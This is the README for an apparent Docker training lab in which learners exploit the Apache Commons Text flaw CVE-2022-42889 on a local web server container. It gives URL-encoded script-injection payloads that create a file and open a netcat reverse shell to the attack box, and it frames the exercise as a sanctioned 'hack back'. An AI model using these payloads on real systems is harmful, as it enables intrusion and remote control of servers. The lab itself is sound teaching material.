# LAB AUDITION

## PREREQUISITE
+ git
+ docker && docker compose

## SETUP THE ENVIRONMENT
+ `git clone `
+ `docker compose up`

### Configure the Kali Attack Box
+ `docker exec -it $(docker ps -aqf "name=attack-box") /bin/bash`
+ In the interactive shell, type `apt update && apt -y install kali-linux-headless`

## CHALLENGES
## Scenario
Globomantics is under cyber seige by the nefarious Dark Kittens Collective hacking conglomerate. As a member of the Globomantics security team, you've just been authorized corporate cover by the board to "hack back" in an attempt to take down these crafty cats. We've got a tip that the Dark Kittens Collective is running a web server at 10.0.0.3:8080, let's check it out!

### Enumeration
+ In the interactive attack box shell, type...
  + `curl -v '10.0.0.3:8080'`
  + `echo "VXNlIHNlYXJjaCBwYXJhbWV0ZXIgZm9yIE1GQQ==" | base64 -d`
  + `curl -XGET '10.0.0.3:8080/search?n=ghost'` (optional: repeat to see MFA code change)
+ We've found the Dark Kittens Collective Multi-Factor Authentication Generator (may come in handy later *future lab storyline enhancement*). This Apache webserver definitely uses scripting and some string replacement functionality. Cue research and we find there is a recently discovered vulnerability in Apache Commons Text that may come in handy if the Dark Kittens Collective hasn't patched yet! Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-42889

### Verification
+ Since this is a takedown, we have no reason for stealth and want to let these Dark Kittens know we are after them so to verify the vulnerability we're going to drop a calling card on the webserver. Tip: Make sure to urlencode the script line so special characters are properly interpreted.
  + To leave a calling card in /tmp/pwned, type `docker exec -it $(docker ps -aqf "name=attack-box") curl -XGET '10.0.0.3:8080/search?n=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Fpwned%27%29%7D'`
  + To verify our calling card is on the webserver, type `docker exec -it $(docker ps -aqf "name=web-server") ls /tmp` 
    + *In real life, the Dark Kittens Collective webserver wouldn't be running in a local docker container (unless you are a hacker cat!) so we wouldn't be able to run this command.*

### Access
+ Leaving calling cards is cool, but we need more to take down these cats. Let's use the same proof of concept to get a reverse shell on the webserver.
+ In the interactive attack box shell, setup a listener `nc -nlvp 8888`
+ To iniative the reverse shell, run `docker exec -it $(docker ps -aqf "name=attack-box") curl -XGET '10.0.0.3:8080/search?n=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%2010.0.0.7%208888%20-e%20%2Fbin%2Fbash%27%29%7D'`
  + Verify access, type `id`
  + **Install the lazer pointer program and watch chaos of the Dark Kittens Collective as they destory each other from within.**
